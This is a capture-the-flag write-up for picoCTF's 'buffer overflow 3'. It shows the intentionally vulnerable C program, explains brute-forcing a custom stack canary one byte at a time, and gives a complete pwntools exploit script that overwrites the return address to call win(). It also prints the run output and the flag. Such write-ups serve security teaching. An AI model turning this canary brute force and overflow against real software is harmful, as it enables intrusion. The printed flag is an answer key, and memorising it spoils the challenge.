# buffer overflow 3
Binary Exploitation, 450 points

## Description:
> It looks like Dr. Xernon added a stack canary to this program to protect against buffer overflows. Do you think you can bypass the protection and get the flag? 

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include <wchar.h>
#include <locale.h>

#define BUFSIZE 32
#define FLAGSIZE 64
#define CANARY_SIZE 4

void win() {
  char buf[FLAGSIZE];
  FILE *f = fopen("flag.txt","r");
  if (f == NULL) {
    printf("Flag File is Missing. Problem is Misconfigured, please contact an Admin if you are running this on the shell server.\n");
    exit(0);
  }

  fgets(buf,FLAGSIZE,f);
  puts(buf);
  fflush(stdout);
}

char global_canary[CANARY_SIZE];
void read_canary() {
  FILE *f = fopen("canary.txt","r");
  if (f == NULL) {
    printf("Canary is Missing. Problem is Misconfigured, please contact an Admin if you are running this on the shell server.\n");
    exit(0);
  }

  fread(global_canary,sizeof(char),CANARY_SIZE,f);
  fclose(f);
}

void vuln(){
   char canary[CANARY_SIZE];
   char buf[BUFSIZE];
   char length[BUFSIZE];
   int count;
   int x = 0;
   memcpy(canary,global_canary,CANARY_SIZE);
   printf("How Many Bytes will You Write Into the Buffer?\n> ");
   while (x<BUFSIZE) {
      read(0,length+x,1);
      if (length[x]=='\n') break;
      x++;
   }
   sscanf(length,"%d",&count);

   printf("Input> ");
   read(0,buf,count);

   if (memcmp(canary,global_canary,CANARY_SIZE)) {
      printf("*** Stack Smashing Detected *** : Canary Value Corrupt!\n");
      exit(-1);
   }
   printf("Ok... Now Where's the Flag?\n");
   fflush(stdout);
}

int main(int argc, char **argv){

  setvbuf(stdout, NULL, _IONBF, 0);
  
  // Set the gid to the effective gid
  // this prevents /bin/sh from dropping the privileges
  int i;
  gid_t gid = getegid();
  setresgid(gid, gid, gid);
  read_canary();
  vuln();
  return 0;
}

```

## Solution:

The program incorporates a custom canary, and if the canary has been overridden - outputs an error and exits. 

A legal session is as follows:
```console
root@kali:/media/sf_CTFs/pico/buffer_overflow_3# ./vuln
How Many Bytes will You Write Into the Buffer?
> 3
Input> AAA
Ok... Now Where's the Flag?
```

If we blindly overrun the canary, we'll hit the error:
```console
root@kali:/media/sf_CTFs/pico/buffer_overflow_3# { echo "100"; python -c 'print "A"*100';} | ./vuln
How Many Bytes will You Write Into the Buffer?
> Input> *** Stack Smashing Detected *** : Canary Value Corrupt!
```

However, since we get to choose the length of the buffer we write, we can overwrite just the first byte of the canary.

If we get it wrong, we'll see:
```console
root@kali:/media/sf_CTFs/pico/buffer_overflow_3# { echo "33"; python -c 'print "A"*32 + "x"';} | ./vuln
How Many Bytes will You Write Into the Buffer?
> Input> *** Stack Smashing Detected *** : Canary Value Corrupt!
```

But if we get it right, we'll see:
```console
root@kali:/media/sf_CTFs/pico/buffer_overflow_3# { echo "33"; python -c 'print "A"*32 + "f"';} | ./vuln
How Many Bytes will You Write Into the Buffer?
> Input> Ok... Now Where's the Flag?
```


Using this, we can brute force the canary, and then override the return address to jump to `win`.

The script:
```python
from pwn import *
import argparse
import os
import simple_cache

EXECUTABLE = "vuln"
LOCAL_PATH = "./"
REMOTE_PATH = "/problems/buffer-overflow-3_3_6bcc2aa22b2b7a4a7e3ca6b2e1194faf/"
SSH_SERVER = "2018shell3.picoctf.com"

CANARY_LEN = 4
PADDING_LEN = 32

def get_process_path(is_ssh = False):
    if is_ssh or os.path.exists(REMOTE_PATH):
        return REMOTE_PATH + EXECUTABLE
    else:
        return LOCAL_PATH + EXECUTABLE

def get_process(ssh_session = None):
    is_ssh = ssh_session is not None
    path = get_process_path(is_ssh)
    params = {"argv": path, "cwd": os.path.dirname(path)}
    if is_ssh:
        p = ssh_session.process(**params)
    else:
        p = process(**params)
    return p

def send_payload(proc, payload):
    proc.sendlineafter("How Many Bytes will You Write Into the Buffer?\n>", str(len(payload)))
    proc.sendlineafter("Input> ", payload)
    out = proc.recvall()
    return out

def guess_canary(ssh_session, guess):
    while True:
        try:
            context.log_level = 'error'
            out = send_payload(get_process(ssh_session), fit({PADDING_LEN: guess}))
            context.log_level = 'info'
            if "Stack Smashing Detected" in out:
                return False
            return True
        except (socket.error, socket.gaierror, socket.herror, socket.timeout) as e:
            print str(e)

#@simple_cache.cached('canary.db')
def get_canary(ssh_session):
    canary = ""
    while len(canary) != CANARY_LEN:
        for x in range(ord(" "), ord("~")+1):
            guess = canary + chr(x)
            log.debug("Guessing canary: " + guess)
            if guess_canary(ssh_session, guess):
                canary += chr(x)
                log.info("Canary so far: " + canary)
                break
        else:
            raise Exception("Can't find canary")
    
    return canary

@simple_cache.cached('offset.db')
def get_overflow_offset():
    # It's problematic to create a core dump on an NTFS file system,
    # so reconfigure core dumps to be created elsewhere
    os.system("echo ~/core/core_dump > /proc/sys/kernel/core_pattern")

    payload = fit({PADDING_LEN: canary}) + cyclic(24)
    proc = get_process()
    send_payload(proc, payload)
    proc.wait()
    offset = cyclic_find(proc.corefile.eip)
    return offset


parser = argparse.ArgumentParser()
parser.add_argument("-s", "--ssh_user", help="Connect via SSH with the given username")
args = parser.parse_args()

if args.ssh_user:
    ssh_session = ssh(host=SSH_SERVER, user=args.ssh_user)
else:
    ssh_session = None


e = ELF(get_process_path())
canary = get_canary(ssh_session)
offset = get_overflow_offset()

log.info("Overflow offset: {}".format(offset))
log.info("Canary: {}".format(canary))
log.info("Address of win(): {}".format(hex(e.symbols['win'])))

payload = fit({PADDING_LEN: canary}) + fit({offset: p32(e.symbols['win'])})
log.info("Payload: {}".format(enhex(payload)))
out = send_payload(get_process(ssh_session), payload)
print out
```

Note that the script uses the cache decorator from [here](https://datascience.blog.wzb.eu/2016/08/12/a-tip-for-the-impatient-simple-caching-with-python-pickle-and-decorators/) in order to cache the overflow offset. 
```python
#https://datascience.blog.wzb.eu/2016/08/12/a-tip-for-the-impatient-simple-caching-with-python-pickle-and-decorators/
import os
import pickle

def cached(cachefile):
    """
    A function that creates a decorator which will use "cachefile" for caching the results of the decorated function "fn".
    """
    def decorator(fn):  # define a decorator for a function "fn"
        def wrapped(*args, **kwargs):   # define a wrapper that will finally call "fn" with all arguments            
            # if cache exists -> load it and return its content
            if os.path.exists(cachefile):
                    with open(cachefile, 'rb') as cachehandle:
                        print("using cached result from '%s'" % cachefile)
                        return pickle.load(cachehandle)

            # execute the function with all arguments passed
            res = fn(*args, **kwargs)

            # write to cache file
            with open(cachefile, 'wb') as cachehandle:
                print("saving result to cache '%s'" % cachefile)
                pickle.dump(res, cachehandle)

            return res

        return wrapped

    return decorator   # return this "customized" decorator that uses "cachefile"
```

This is needed since when running on the server, we don't have easy access to the core dump, and when running locally, we don't know the server canary. So we run once locally with a dummy canary, get the overflow offset, and save it for the server session.

The output:
```console
root@kali:/media/sf_CTFs/pico/buffer_overflow_3# python exploit.py --ssh_user=$pico_ssh_user
[+] Connecting to 2018shell3.picoctf.com on port 22: Done
[*] user@2018shell3.picoctf.com:
    Distro    Ubuntu 16.04
    OS:       linux
    Arch:     amd64
    Version:  4.4.0
    ASLR:     Enabled
[*] '/media/sf_CTFs/pico/buffer_overflow_3/vuln'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
[*] Canary so far: I
[*] Canary so far: IH
[*] Canary so far: IHw
[*] Canary so far: IHwj
using cached result from 'offset.db'
[*] Overflow offset: 16
[*] Canary: IHwj
[*] Address of win(): 0x80486eb
[*] Payload: 61616161626161616361616164616161656161616661616167616161686161614948776a61616161626161616361616164616161eb860408
[+] Starting remote process '/problems/buffer-overflow-3_3_6bcc2aa22b2b7a4a7e3ca6b2e1194faf/vuln' on 2018shell3.picoctf.com: pid 2618362
[+] Receiving all data: Done (64B)
[*] Stopped remote process 'vuln' on 2018shell3.picoctf.com (pid 2618362)
Ok... Now Where's the Flag?
picoCTF{eT_tU_bRuT3_F0Rc3_58bc7747}

[*] Stopped process './vuln' (pid 5782)
```

The flag: picoCTF{eT_tU_bRuT3_F0Rc3_58bc7747}